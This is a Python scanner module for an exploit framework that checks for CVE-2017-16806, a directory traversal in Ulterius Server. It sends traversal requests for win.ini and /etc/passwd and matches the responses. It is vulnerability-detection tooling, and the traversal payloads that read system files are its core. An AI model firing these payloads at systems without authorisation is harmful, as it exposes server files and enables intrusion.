#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Ulterius Server before 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Ulterius Server < 1.9.5.0 - Directory Traversal Detection',
        'description': 'Ulterius Server before 1.9.5.0 allows HTTP server directory traversal via the process function in RemoteTaskServer/WebServer/HttpServer.cs.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2017', 'ulterius', 'traversal', 'edb', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/43141',
            'https://nvd.nist.gov/vuln/detail/CVE-2017-16806',
            'https://github.com/Ulterius/server/commit/770d1821de43cf1d0a93c79025995bdd812a76ee',
            'https://www.exploit-db.com/exploits/43141/',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2017-16806',
    }

    def run(self):
        for path in ('/.../.../.../.../.../.../.../.../.../windows/win.ini', '/.../.../.../.../.../.../.../.../.../etc/passwd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:.*:0:0:', '\\[(font|extension|file)s\\]',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="Ulterius Server < 1.9.5.0 - Directory Traversal detected",
                    path=path,
                )
                return True
        return False

